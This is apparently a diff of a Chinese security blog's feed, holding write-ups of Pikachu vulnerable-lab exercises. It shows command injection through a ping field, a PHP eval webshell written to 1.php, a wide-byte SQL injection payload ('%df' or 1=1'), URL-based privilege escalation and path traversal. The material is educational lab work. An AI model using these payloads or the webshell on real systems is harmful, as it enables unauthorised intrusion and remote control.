-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;ipaddress&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$ip</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ipaddress&#x27;</span>];</span><br><span class="line"><span class="comment">//     $check=explode(&#x27;.&#x27;, $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="title function_ invoke__">php_uname</span>(<span class="string">&#x27;s&#x27;</span>), <span class="string">&#x27;windows&#x27;</span>))&#123;</span><br><span class="line"><span class="comment">//         var_dump(php_uname(&#x27;s&#x27;));</span></span><br><span class="line">        <span class="variable">$result</span>.=<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping &#x27;</span>.<span class="variable">$ip</span>);<span class="comment">//直接将变量拼接进来，没做处理</span></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result</span>.=<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping -c 4 &#x27;</span>.<span class="variable">$ip</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h1><p>eval可以执行 php 的一些代码。</p>
-<p>我们先看看这题，我们输一下 php 代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../../img/docs/pikachu/RCE/1738502272134-3624c632-f4c2-444e-a51c-05fd41d23ecc.png"></p>
-<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;&lt;?php @eval(\$_POST[\&quot;123\&quot;]); ?&gt;&#x27; &gt; 1.php&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>我们可以去 ping 那里看我们创建 1.php</p>
-<p>然后同样的去蚁剑去利用。</p>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>我们这一关本身就有 eval 命令，我们就可以利用这点</p>
-<p>我们看到 POST 请求，name 有 txt 和 submit，我们的 txt 相当于 123，而 submit 我们就需要在蚁剑中设置。</p>
-<p><strong>步骤</strong></p>
-<p><img src="/../../img/docs/pikachu/RCE/1738503233389-216bb44b-34f2-4f3b-b35f-b896dded859c.png"></p>
-<p><img src="/../../img/docs/pikachu/RCE/1738503299951-facc0838-0d38-425b-a0a2-daa66040dd48.png"></p>
-<p><img src="/../../img/docs/pikachu/RCE/1738503318036-66e70479-203b-41a4-babb-a44ba1a586e2.png"></p>
-<p><img src="/../../img/docs/pikachu/RCE/1738503568742-93a285d9-1c9b-41d9-a3ab-cda8438b00d4.png"></p>
 ]]></content>
       <categories>
         <category>网安</category>
@@ -545,7 +443,17 @@
 <p>在这里我们可以使用 burpsuite 或者自己写脚本来进行爆破。</p>
 <p>这种爆破速度非常快，如果 26 字母组成的，最多需要 26*length 步就可以进行爆破出用户名，只需要修改 substr 第二个参数即可。</p>
 <h1 id="盲注-base-on-time"><a href="#盲注-base-on-time" class="headerlink" title="盲注(base on time)"></a>盲注(base on time)</h1><p>这个是<strong>基于时间</strong>的盲注。可以通过时间差来知道正确还是错误（对应着布尔盲注的 True 和 False），从而进行盲注，不做多赘述。总的来说，盲注最好使用工具，自己写脚本。</p>
-<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1>]]></content>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>在 Burpsuite 进行拦截修改 POST 请求内容即可。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">lili<span class="operator">%</span>df<span class="string">&#x27; or 1=1 --+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>重要代码部分</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=&#x27;<span class="subst">$name</span>&#x27;&quot;</span>;<span class="comment">//这里的变量是字符型，需要考虑闭合</span></span><br><span class="line"><span class="comment">//设置mysql客户端来源编码是gbk,这个设置导致出现宽字节注入问题</span></span><br><span class="line"><span class="variable">$set</span> = <span class="string">&quot;set character_set_client=gbk&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，对 POST 请求 name 字段中的内容进行了转义。一般是以下的内容进行转义，可以看到，如果我们用反斜杆进行绕过，最后还是会被转义为三个反斜杠(&#x2F;&#x2F;&#x2F;)。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">NUL</span> (ASCII <span class="number">0</span>), \n, \r, \, <span class="string">&#x27;, &quot;, and Control-Z.</span></span><br></pre></td></tr></table></figure>
+
+<p>下面的设置是将其编码格式改为 GBK，二字节编码的。看我们前面，我们就用了%df 进行绕过（其实感觉很多一字节的 URL 编码都可以，不过我看别人用%df 很多，可能就是一个正经的汉字吧）。所以说在 php 函数 escape 进行处理的时候，’的出现就会有一个转义一个反斜杠，不过在 php 的 mysqli 当中，因为设置了 gbk 编码，导致宽字节(有需要的两字符当一个，在这里导致%df 和反斜杠进行合并为一个宽字节)，我们就成功的进行绕过。</p>
+]]></content>
       <categories>
         <category>网安</category>
         <category>靶场</category>
@@ -556,21 +464,97 @@
       </tags>
   </entry>
   <entry>
-    <title>Unsafe Filedownload</title>
-    <url>/posts/21842.html</url>
-    <content><![CDATA[<p>不安全的文件下载</p>
-<p>我们随便看一个下载链接</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://192.168.17.129:8000/vul/unsafedownload/execdownload.php?filename=kb.png</span><br></pre></td></tr></table></figure>
+    <title>Over Permisson</title>
+    <url>/posts/687.html</url>
+    <content><![CDATA[<h1 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h1><p>我们输入 kobe 的账号密码，进入进去，查看个人资料，我们发现 URL 上面的信息，我们可以尝试改成其他用户名(lucy&#x2F;lili&#x2F;kobe)</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%<span class="number">82</span>%B9%E5%<span class="number">87</span>%BB%E6%<span class="number">9</span>F%A5%E7%<span class="number">9</span>C%<span class="number">8</span>B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%<span class="number">81</span>%AF</span><br></pre></td></tr></table></figure>
 
-<p>我们看到 filename&#x3D;kb.png 那我们将 filename 后面对应的文件改掉怎么样？我们发现文件不存在，这是怎么回事。</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://192.168.17.129:8000/vul/unsafedownload/execdownload.php?filename=down<span class="emphasis">_nba.php</span></span><br></pre></td></tr></table></figure>
+<p>发现改成 lucy 的，在 kobe 页面也可以看到 lucy 的个人信息，这就是水平越权漏洞了。同样的可以看到 lili 的信息。</p>
+<p><img src="/../../img/docs/pikachu/Over_Permisson/1738553620437-17c0ab66-0230-4549-a5eb-478576d1e285.png"></p>
+<h1 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h1><p>提供了 admin&#x2F;123456、pikachu&#x2F;000000，还说明了 admin 是超级用户，我们登录 admin 账号试试。同样的我们发现了添加用户和删除用户的 URL，我们就登录看 pikachu 这个账户看能不能利用即可。</p>
+<p>添加用户的 URL</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure>
 
-<p>我们通过浏览器看图片的相对路径，发现前面多了一个 download 文件夹，很像上一节的本地包含。</p>
-<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Filedownload&#x2F;1738548563371-688798e2-0762-4471-8a7c-f44b68e8fbae.png)</p>
-<p>说干就干，我们把路径改成下面这样</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://192.168.17.129:8000/vul/unsafedownload/execdownload.php?filename=../down<span class="emphasis">_nba.php</span></span><br></pre></td></tr></table></figure>
+<p>删除用户的 URL 之一</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op2/op2_admin.php?id=<span class="number">6</span></span><br></pre></td></tr></table></figure>
 
-<p>OK，down_nba.php 下载下来了。</p>
+<p>发现添加用户的 URL 在 pikachu 中可以进去。</p>
+<p><img src="/../../img/docs/pikachu/Over_Permisson/1738554015974-aad2bdd0-7499-473b-9e7d-6f206391ce35.png"></p>
+<p>我们通过 admin 可以看到 hhh 的 id 为 28。我们再切换到 pikachu 去删除它，发现 pikachu 没有删除的权限。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/overpermission/op2/op2_admin.php?id=<span class="number">28</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RCE</title>
+    <url>/posts/4689.html</url>
+    <content><![CDATA[<p><strong>RCE</strong>(remote command&#x2F;code execute)远程命令&#x2F;代码执行。</p>
+<h1 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h1><h2 id="Docker-安装-ping-命令工具"><a href="#Docker-安装-ping-命令工具" class="headerlink" title="Docker 安装 ping 命令工具"></a>Docker 安装 ping 命令工具</h2><p>由于我们 docker 中并不能执行 ping 命令，所以我们需要安装 ping 命令的工具。</p>
+<p>我们先进入 docker pikachu 的容器（注意需要 sudo）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it [容器ID] [/bin/bash]</span><br></pre></td></tr></table></figure>
+
+<p>进去之后，就用 apt 工具进行安装</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install iputils-ping</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/RCE/1738494111038-a345300b-250c-443d-84b8-40d91afd33ce.png"></p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>和 SQL&#x2F;XSS 注入一样，都可以堆输入框进行命令构造。SQL 构造的是 SQL 语句，XSS 一般构造 HTML 或者 JS，而 RCE 在这里构造 SHELL 命令。</p>
+<p>在 Linux 中，ping 命令是一直执行的，所以上面应该是</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping -c 4 [addr]</span><br></pre></td></tr></table></figure>
+
+<p>我们的输入就是 addr，这也是我们构造的地方。如果我们想查看当前目录的文件，就构造成了</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping -c 4 www.baidu.com ; ls</span><br></pre></td></tr></table></figure>
+
+<p>这里的分号是 Linux Shell 中的元字符，用于执行多条命令，几十前面的代码错了也可以执行。所以我们只需要输入 <a href="http://www.baidu.com/">www.baidu.com</a> ; ls</p>
+<p><img src="/../../img/docs/pikachu/RCE/1738496420639-d843a8f9-2f4a-4c33-9397-c50789d0efc9.png"></p>
+<p>OK，我们就可以执行其他命令。</p>
+<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>php 的一句话木马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;123&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>@：后面代码错误也不报错</li>
+<li>eval 执行括号内的命令(php 代码)</li>
+<li>$_POST 通过 POST 获取数据</li>
+</ol>
+<p>$_POST[‘123’] 用于获取 123 的</p>
+<p>构造成</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ping -c <span class="number">4</span> www.baidu.com ; <span class="keyword">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&#x27;</span><span class="number">123</span><span class="string">&#x27;]); ?&gt;&#x27;</span> &gt; <span class="number">1</span>.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/RCE/1738501130163-91a1dbee-ed07-4dd4-b9ad-4fdf9f83162f.png"></p>
+<p>我们 ls 一下，多了一个 1.php，我们就可以利用这个去提权或者怎么样了。</p>
+<p><img src="/../../img/docs/pikachu/RCE/1738501161386-be20f31a-2102-4dd6-95e3-8dc6f5adda1b.png"></p>
+<p>利用菜刀或者蚁剑工具去利用</p>
+<p><img src="/../../img/docs/pikachu/RCE/1738501310483-40b1685a-e15e-4b90-a6f6-eba41ab04a52.png"></p>
+<p>目录查看</p>
+<p><img src="/../../img/docs/pikachu/RCE/1738501341495-b7591b6c-fdf1-44ff-a1fc-8e04514f375f.png"></p>
+<p>shell 命令执行</p>
+<p><img src="/../../img/docs/pikachu/RCE/1738501366014-3800f804-6e09-4fc3-b8d3-2c4a4f2c9366.png"></p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>用 shell_exec 来执行 ping 命令的。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;ipaddress&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$ip</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ipaddress&#x27;</span>];</span><br><span class="line"><span class="comment">//     $check=explode(&#x27;.&#x27;, $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="title function_ invoke__">php_uname</span>(<span class="string">&#x27;s&#x27;</span>), <span class="string">&#x27;windows&#x27;</span>))&#123;</span><br><span class="line"><span class="comment">//         var_dump(php_uname(&#x27;s&#x27;));</span></span><br><span class="line">        <span class="variable">$result</span>.=<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping &#x27;</span>.<span class="variable">$ip</span>);<span class="comment">//直接将变量拼接进来，没做处理</span></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result</span>.=<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping -c 4 &#x27;</span>.<span class="variable">$ip</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h1><p>eval可以执行 php 的一些代码。</p>
+<p>我们先看看这题，我们输一下 php 代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/RCE/1738502272134-3624c632-f4c2-444e-a51c-05fd41d23ecc.png"></p>
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;&lt;?php @eval(\$_POST[\&quot;123\&quot;]); ?&gt;&#x27; &gt; 1.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们可以去 ping 那里看我们创建 1.php</p>
+<p>然后同样的去蚁剑去利用。</p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>我们这一关本身就有 eval 命令，我们就可以利用这点</p>
+<p>我们看到 POST 请求，name 有 txt 和 submit，我们的 txt 相当于 123，而 submit 我们就需要在蚁剑中设置。</p>
+<p><strong>步骤</strong></p>
+<p><img src="/../../img/docs/pikachu/RCE/1738503233389-216bb44b-34f2-4f3b-b35f-b896dded859c.png"></p>
+<p><img src="/../../img/docs/pikachu/RCE/1738503299951-facc0838-0d38-425b-a0a2-daa66040dd48.png"></p>
+<p><img src="/../../img/docs/pikachu/RCE/1738503318036-66e70479-203b-41a4-babb-a44ba1a586e2.png"></p>
+<p><img src="/../../img/docs/pikachu/RCE/1738503568742-93a285d9-1c9b-41d9-a3ab-cda8438b00d4.png"></p>
 ]]></content>
       <categories>
         <category>网安</category>
@@ -625,74 +609,21 @@
       </tags>
   </entry>
   <entry>
-    <title>Pikachu靶场————暴力破解</title>
-    <url>/posts/61262.html</url>
-    <content><![CDATA[<p>使用到的工具：</p>
-<p>BurpSuite</p>
-<h1 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h1><p>通过提示，我们知道答案</p>
-<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738027607189-bd41dc16-a8cc-4c52-9139-d52b86a612d7.png"></p>
-<p>我们使用 burpsuite 进行暴力破解</p>
-<p>使用步骤</p>
-<ol>
-<li>拦截网页（intercept）</li>
-<li>发送到 Intruder</li>
-<li>在 Intruder 给用户名密码标注，在 Payloads 设定密码库</li>
-<li>然后进行攻击(attack)</li>
-</ol>
-<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738027869685-c1b8d3f5-f9e3-4721-908b-c9ed6cbcf3b7.png"></p>
-<p>可以看到 admin&#x2F;123456 和 test&#x2F;abc123 接收的长度为 33，相比较于下面 56 的比较小，不过上面是属实不知道乍回事。</p>
-<h1 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h1><p>提示： 验证码好像一直有效  </p>
-<p>不过我试了一下，在网页直接用原来的验证码不行，所以还是得用 burpsuite 进行拦截。</p>
-<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738028136596-0767d937-36d4-4b6d-ab53-2f233797f190.png"></p>
-<p>只需要对这两个进行攻击即可。</p>
-<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738028391224-1fd72c3a-8949-4583-a568-78d605354a6e.png"></p>
-<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738028409556-86e33eaa-3cc7-4f6d-9bd6-e23a6f8aaf32.png"></p>
-<h1 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h1><p>这里说是客户端的，就是前端的，那就可以在浏览器上进行修改了，很容易就查到了相关的 js 函数。</p>
-<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738028584704-5796f23a-18d6-417b-9c09-df7cd17088f6.png"></p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> code; <span class="comment">//在全局 定义验证码</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">  code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> codeLength = <span class="number">5</span>;<span class="comment">//验证码的长度</span></span><br><span class="line">  <span class="keyword">var</span> checkCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;checkCode&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> selectChar = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>);<span class="comment">//所有候选组成验证码的字符，当然也可以用中文的</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; codeLength; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> charIndex = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">36</span>);</span><br><span class="line">    code += selectChar[charIndex];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//alert(code);</span></span><br><span class="line">  <span class="keyword">if</span> (checkCode) &#123;</span><br><span class="line">    checkCode.<span class="property">className</span> = <span class="string">&quot;code&quot;</span>;</span><br><span class="line">    checkCode.<span class="property">value</span> = code;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> inputCode = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#bf_client .vcode&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">  <span class="keyword">if</span> (inputCode.<span class="property">length</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;请输入验证码！&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inputCode != code) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;验证码输入错误！&quot;</span>);</span><br><span class="line">    <span class="title function_">createCode</span>();<span class="comment">//刷新验证码</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">createCode</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    <title>Unsafe Filedownload</title>
+    <url>/posts/21842.html</url>
+    <content><![CDATA[<p>不安全的文件下载</p>
+<p>我们随便看一个下载链接</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://192.168.17.129:8000/vul/unsafedownload/execdownload.php?filename=kb.png</span><br></pre></td></tr></table></figure>
 
-<p>在浏览器上将这里面的 createCode 函数只写一个 return true;即可，然后填上信息，让 burpsuite 来拦截。</p>
-<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738029139419-1cdd8aca-6da5-4008-be04-1820b582f36a.png"></p>
-<h1 id="token-防爆破？"><a href="#token-防爆破？" class="headerlink" title="token 防爆破？"></a>token 防爆破？</h1><p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738030434932-9d57aa47-e9a5-481b-82e1-4070dd830631.png"></p>
-<p>在浏览器定位 Login 按钮，发现上方还有这个隐藏（hidden）的输入消息，这里面的 value 值每次刷新都会改变，没看到 js 的代码，应该是服务器自己给的。</p>
-<p>我们通过 burpsuite 拦截一下。</p>
-<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738030588852-0e5a3b09-62b3-46c1-9464-4028bcba1f56.png"></p>
-<p>根据其他教程的方法，都是只给 password 和 token 加上$号，是因为我们每次并发量是 1，所以每次发送一个导致速度上不来，所以就不考虑 username 了。（我们这里也一样）</p>
-<p>攻击类型(Attack type)选择 pitchfork。</p>
-<p>给 password 设置为 simple list，给上我们的爆破密码库。</p>
-<p>给 token 设置为 recursive grep（循环查找字符串）（可以用于每次重新获取网站的某个字符串）</p>
-<p>在 Setting 界面（老版本应该是 Option 界面）中的 redirections（重定向）中设置 always（总是）。</p>
-<p>然后再 Setting 界面的 grep(查找字符串) - Extract 点击 Add</p>
-<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738032166719-6f267018-f6c5-45c5-82f3-4959e02f2083.png"></p>
-<p>就可以对重定向文本进行定位了。</p>
-<p>最后我们将我们的并发数（concurrent）的最大值设置为 1，每次只发一条请求。</p>
-<p>进行攻击</p>
-<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738031279722-371c1a59-8575-4e0b-8645-c5df9c544273.png"></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Burpsuite 使用到的功能</p>
-<ol>
-<li>通过 Cluster Bomb 进行账户密码的爆破</li>
-<li>对验证码不变（不进行销毁）的登录框进行 js 修改（client），最后爆破。</li>
-<li>对需要 token 验证的登录框，进行 Pitchfork 进行重定向文本爆破。</li>
-</ol>
-]]></content>
-      <categories>
-        <category>网安</category>
-        <category>靶场</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>网安</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>敏感信息泄露</title>
-    <url>/posts/2190.html</url>
-    <content><![CDATA[<p>它这里是一个登录界面，由于这章的原因，所以我们就不找 SQL 的注入点了。</p>
-<h1 id="敏感信息一"><a href="#敏感信息一" class="headerlink" title="敏感信息一"></a>敏感信息一</h1><p>我们用浏览器的查看器，定位到登录框，就可以看到有一行注释，就泄露了一个测试账号的账号密码。</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">测试账号:lili/<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+<p>我们看到 filename&#x3D;kb.png 那我们将 filename 后面对应的文件改掉怎么样？我们发现文件不存在，这是怎么回事。</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://192.168.17.129:8000/vul/unsafedownload/execdownload.php?filename=down<span class="emphasis">_nba.php</span></span><br></pre></td></tr></table></figure>
 
-<h1 id="敏感信息二"><a href="#敏感信息二" class="headerlink" title="敏感信息二"></a>敏感信息二</h1><p>我们把 php 那个文件名删掉，可以看到一个目录，这也是敏感信息泄露。</p>
-<p><img src="/../../img/docs/pikachu/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/1738574032795-677e22e9-b509-4456-8d35-eb5091bbd6d6.png"></p>
+<p>我们通过浏览器看图片的相对路径，发现前面多了一个 download 文件夹，很像上一节的本地包含。</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Filedownload&#x2F;1738548563371-688798e2-0762-4471-8a7c-f44b68e8fbae.png)</p>
+<p>说干就干，我们把路径改成下面这样</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://192.168.17.129:8000/vul/unsafedownload/execdownload.php?filename=../down<span class="emphasis">_nba.php</span></span><br></pre></td></tr></table></figure>
+
+<p>OK，down_nba.php 下载下来了。</p>
 ]]></content>
       <categories>
         <category>网安</category>
@@ -860,6 +791,85 @@
